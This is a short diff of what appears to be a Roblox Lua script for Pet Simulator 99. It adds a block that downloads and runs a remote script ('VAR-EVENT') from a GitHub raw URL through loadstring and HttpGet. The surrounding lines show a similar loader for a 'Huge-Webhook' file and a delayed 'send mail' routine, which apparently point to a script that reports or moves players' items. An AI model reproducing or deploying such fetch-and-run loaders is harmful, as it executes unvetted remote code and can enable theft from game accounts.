@@ -8,6 +8,10 @@ spawn(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Hoith95/Pet-99/main/Huge-Webhook"))()
 end)
 
+spawn(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hoith95/Pet-99/main/VAR-EVENT"))()
+end)
+
 --- Gửi Mail ---
 spawn(function()
 wait(15)
